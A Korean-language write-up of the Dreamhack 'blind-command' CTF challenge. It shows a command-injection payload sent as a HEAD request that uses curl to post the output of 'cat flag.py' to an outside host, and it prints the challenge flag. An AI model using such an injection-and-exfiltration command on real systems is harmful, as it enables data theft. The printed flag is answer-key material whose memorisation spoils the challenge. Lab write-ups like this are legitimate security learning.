<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
    <h1> Dreamhack "blind-command"  Write-UP</h1>
</body>
<br>
<br>
</html>

2024.08.14 풀이

![image](https://github.com/user-attachments/assets/328301d5-2eb0-41b0-b3c0-5524626258a5)

Dreamhack 워게임에 있는 2단계의 blind-command를 풀어보려고 한다. 

<br>
 
</br>

![image](https://github.com/user-attachments/assets/6f7207ce-5d94-4d70-b007-f3f231b37be6)

서버에 연결해보니, ?cmd=[cmd] 화면이 출력되었다.

<br>
 
</br>

문제 파일을 살펴보니, app.py 파일만 있었다.

<br>
 
</br>

## app.py

![image](https://github.com/user-attachments/assets/bb1375a6-8aec-420c-86ba-8c3f8f83bece)

코드 내용을 살펴보니, 이는 cmd 매개변수를 가지고 있는데, 이 매개변수의 값이 없으면 아까 본 ?cmd=[cmd] 화면을 출력하는 내용이었다. 이와 반대로 GET 메소드는 막혀있는 것을 볼 수 있었다.

<br>
 
</br>

## flag
GET 메소드가 막혀있기 때문에, 다른 메소드를 사용해서 flag 값에 접근하려고 한다. 
버프 스위트를 사용해서, 패킷을 살펴보고 수정하려고 한다. 

<br>
 
</br>

![image](https://github.com/user-attachments/assets/495cdfb1-4693-4223-a6dc-5dcd9c54c92b)

![image](https://github.com/user-attachments/assets/d7babfcf-dbb3-4576-afcd-a815fdf7acc5)

버프 스위트를 통해, GET으로 구성된 패킷을 HEAD 메소드로 바꾸고, cmd 명령어로 curl 명령어를 넣고, flag.py를 출력하기 위해, cat flag.py를 입력해서,

<br>
 
</br>

```
HEAD /?cmd=curl+http://host3.dreamhack.games:21749//+-d+"$(cat+flag.py)" HTTP/1.1
```

화면에 flag값이 출력되었다. 

<br>
</br>

```
DH{4c9905b5abb9c3eb10af4ab7e1645c23}
```

<br>
 
</br>

![image](https://github.com/user-attachments/assets/3e84fc25-ec68-4111-b3dc-61b65c81ce5d)

이렇게 문제 해결을 할 수 있었다.
